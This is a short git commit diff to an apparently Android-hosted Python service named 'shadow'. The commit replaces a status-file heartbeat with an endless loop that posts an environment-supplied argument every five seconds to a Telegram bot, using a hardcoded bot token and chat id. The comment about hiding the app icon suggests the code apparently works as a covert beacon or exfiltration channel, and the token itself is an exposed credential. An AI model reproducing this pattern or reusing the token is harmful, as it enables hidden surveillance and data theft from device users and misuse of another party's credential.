bb2932db1e3efaecb72010090043cfb378fd4a02
his-bullah <his.bullah.pvt.060@gmail.com>
2026-03-04 05:32:01 +0530

    Update main.py

--- service/main.py
+++ service/main.py
@@ -1,13 +1,5 @@
-import time,requests
+import time,requests,os
 
-with open('/sdcard/shadow_status.txt', 'w') as f:
-    f.write('running')
-
-try:
-    while True:
-        requests.post("https://api.telegram.org/bot8498919917:AAEJrci5vCXGL2_uvpYHyFhv6qGEi1iohqI/sendMessage", data={'chat_id':'7589082187','text':'Working...'})
-        time.sleep(5)
-except Exception as error:
-    # Service crash or kill - show icon back
-    with open('/sdcard/shadow_status.txt', 'w') as f:
-        f.write('stopped')
+while True:
+    requests.post("https://api.telegram.org/bot8498919917:AAEJrci5vCXGL2_uvpYHyFhv6qGEi1iohqI/sendMessage", data={'chat_id':'7589082187','text':os.environ.get('PYTHON_SERVICE_ARGUMENT','No argv Found')})
+    time.sleep(5)
